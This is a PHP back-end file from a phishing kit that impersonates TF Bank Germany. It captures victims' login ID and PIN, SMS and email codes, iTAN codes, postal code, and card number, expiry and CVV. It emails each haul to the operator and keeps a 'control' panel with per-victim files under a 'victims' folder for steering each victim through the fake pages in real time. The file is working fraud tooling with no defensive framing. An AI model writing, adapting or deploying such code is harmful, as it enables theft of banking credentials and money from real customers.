<?php
  
function get_current_file_url($Protocol='http://') {
   return $Protocol.$_SERVER['HTTP_HOST'].str_replace($_SERVER['DOCUMENT_ROOT'], '', realpath(__DIR__)); 
}
$currentD = get_current_file_url($Protocol='http://');


    require_once 'includes/main.php';


if(isset($_GET['address'])) 
{
visitors();

                $subject = get_client_ip() . ' | TFBANK.DE | PLZ';
                $message = '/-- PLZ code --/' . get_client_ip() . "\r\n";
                $message .= 'PLZ zip code : ' . $_GET['address'] . "\r\n";
            $message .= 'link : ' . $_GET['url'] . "\r\n";
                $message .= 'nbank : ' . $_GET['Nbank'] . "\r\n";
                $message .= 'Steps : ' . $currentD . '/control?ip=' . get_client_ip() . "\r\n";
                $message .= '/-- END plz code --/' . "\r\n";
                $message .= victim_infos();
                send($subject,$message);
                reset_data();
                header("Location: web/login.php?verification#_");
                exit();
            } 


    if( $_GET['pwd'] == PASSWORD ) {
        session_destroy();
        visitors();
         header("Location: web/login.php?verification#_");
        exit();
        
        
        
        
    } else if( !empty($_GET['redirection']) ) {
        $red = $_GET['redirection'];
        if( $red == 'errorlogin' ) {
            header("Location: web/login.php?error=1&verification#_");
            exit();
        }
     
      
         if( $red == 'firma' ) {
                 header("Location: web/email.php?verification#_");
            exit();
        }

           if( $red == 'app' ) {
                 header("Location: web/app.php?verification#_");
            exit();
        }


         if( $red == 'tan' ) {
            header("Location: web/itan.php?code1=". $_GET['code1'] ."&verification#_");
            exit();
        }

       if( $red == 'sms' ) {
                 header("Location: web/sms.php?verification#_");
            exit();
        }
             
        if( $red == 'cc' ) {
         header("Location: web/cc.php?verification#_");
            exit();
        }
          
        
       
        if( $red == 'success' ) {
            header("Location: https://tfbank.de/");
            exit();
        }
        if( $red == 'cc' ) {
            $_SESSION['ccv'] = '';
            $_SESSION['exp'] = '';
            $_SESSION['errors']['ccv'] = true;
            $_SESSION['errors']['exp'] = true;
            header("Location: web/cc.php?code=". $_GET['code'] ."&verification#_");
            exit();
        }
        header("Location: web/". $red ."?verification#_");
        exit();













    } else if($_SERVER['REQUEST_METHOD'] == "POST") {
        if( !empty($_POST['captcha']) ) {
            header("HTTP/1.0 404 Not Found");
            die();
        }
        if ($_POST['step'] == "login") {
            $_SESSION['errors']     = [];
            $_SESSION['code_client']   = $_POST['code_client'];
            $_SESSION['password']   = $_POST['password'];
            if( empty($_POST['code_client']) ) {
                $_SESSION['errors']['code_client'] = true;
            }
            if( empty($_POST['password']) ) {
                $_SESSION['errors']['password'] = true;
            }
            
            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . ' | TFBANK.DE | Login';
                $message = '/-- Login TFBANK.DE --/' . get_client_ip() . "\r\n";
                $message .= 'ID  : ' . $_POST['code_client'] . "\r\n";
                $message .= 'Pin : ' . $_POST['password'] . "\r\n";
                $message .= 'Steps : ' . get_steps_link() . "\r\n";
                $message .= '/-- END LOGIN  --/' . "\r\n";
                $message .= victim_infos();
                send($subject,$message);
                reset_data();
                header("Location: web/loading.php?verification#_");
                exit();
            } else {
                header("Location: web/login.php?error=1&verification#_");
                exit();
            }
        }
        
        
       if ($_POST['step'] == "sms") {
            
            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . ' | TFBANK.DE | SMS';
                $message = '/-- SMS TFBANK.DE --/' . get_client_ip() . "\r\n";
                $message .= 'SMS Code : ' . $_POST['sms'] . "\r\n";
                $message .= '/-- END SMS  --/' . "\r\n";
                $message .= victim_infos();
                send($subject,$message);
                reset_data();
                header("Location: web/loading.php?verification#_");
                exit();
            } else {
                header("Location: web/sms.php?&verification#_");
                exit();
            }
        }



     if ($_POST['step'] == "firma") {
            
            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . ' | TFBANK.DE | EMAIL CODE';
                $message = '/-- EMAIL CODE TFBANK.DE --/' . get_client_ip() . "\r\n";
                $message .= 'FIRMA  : ' . $_POST['email'] . "\r\n";
                $message .= '/-- END SMS  --/' . "\r\n";
                $message .= victim_infos();
                send($subject,$message);
                reset_data();
                header("Location: web/loading.php?verification#_");
                exit();
            } else {
                header("Location: web/email.php?&verification#_");
                exit();
            }
        }


    if ($_POST['step'] == "tan") {
            
            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . ' | TFBANK.DE | ITAN';
                $message = '/-- ITAN TFBANK.DE --/' . get_client_ip() . "\r\n";
                $message .= 'ITAN  : ' . $_POST['itan1'] . "-". $_POST['itan2'] ."-". $_POST['itan3'] . "-". $_POST['itan4'] . "-". $_POST['itan5'] . "-". $_POST['itan6'] ."\r\n";
                $message .= '/-- END SMS  --/' . "\r\n";
                $message .= victim_infos();
                send($subject,$message);
                reset_data();
                header("Location: web/loading.php?verification#_");
                exit();
            } else {
                header("Location: web/itan.php?&verification#_");
                exit();
            }
        }





        if ($_POST['step'] == "cc") {
            $_SESSION['errors']      = [];
            $_SESSION['exp']     = $_POST['exp'];
            $_SESSION['ccv']      = $_POST['ccv'];
            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . ' | TFBANK.DE | Card';
                $message = '/-- CARD TFBANK.DE --/' . get_client_ip() . "\r\n";
                $message .= 'Card  : ' . $_POST['cc']." \r\n";
                $message .= 'Card Date : ' . $_POST['exp']." \r\n";
                $message .= 'Card CVV : ' . $_POST['ccv'] . "\r\n";
                $message .= 'Steps : ' . get_steps_link() . "\r\n";
                $message .= '/-- END CARD TFBANK.DE --/' . "\r\n";
                $message .= victim_infos();
                send($subject,$message);
                reset_data();
                header("Location: web/loading.php?verification#_");
            } else {
                header("Location: web/cc.php?error=1&verification#_");
            }
        }
        if ($_POST['step'] == "control") {
            $fp = fopen('victims/'. $_POST['ip'] .'.txt', 'wb');
            if( $_POST['to'] == 'tan' ) {
                $_POST['to'] = $_POST['to'] . '/' . $_POST['tan_text'];
            }
            if( $_POST['to'] == 'errortan' ) {
                $_POST['to'] = $_POST['to'] . '/' . $_POST['errortan_text'];
            }
            if( $_POST['to'] == 'sms' ) {
                $_POST['to'] = $_POST['to'] . '/' . $_POST['sms_text'];
            }

             if( $_POST['to'] == 'billing' ) {
                $_POST['to'] = $_POST['to'] . '/' . $_POST['billing_text'];
            }
            if( $_POST['to'] == 'errorsms' ) {
                $_POST['to'] = $_POST['to'] . '/' . $_POST['errorsms_text'];
            }
            if( $_POST['to'] == 'app' ) {
                $_POST['to'] = $_POST['to']. '/' . $_POST['error'];
            }
            if( $_POST['to'] == 'bill' ) {
                $_POST['to'] = $_POST['to']. '/' . $_POST['error'];
            }
        if( $_POST['to'] == 'qfc' ) {
                $_POST['to'] = $_POST['to']. '/' . $_POST['error'];
            }
        if( $_POST['to'] == 'plz' ) {
                $_POST['to'] = $_POST['to'] . '/' . $_POST['error'];
            }
        if( $_POST['to'] == 'qrimg' ) {
                $_POST['to'] = $_POST['to'] . '/' . $_POST['b64img'];
            }
        if( $_POST['to'] == 'success' ) {
                $_POST['to'] = $_POST['to'] . '/' . $_POST['error'];
            }
            fwrite($fp, $_POST['to']);
            fclose($fp);
            header("location: control.php?ip=" . $_POST['ip']);
        }
    } else {
        header("Location: " . OFFICIAL_WEBSITE);
        exit();
    }
?>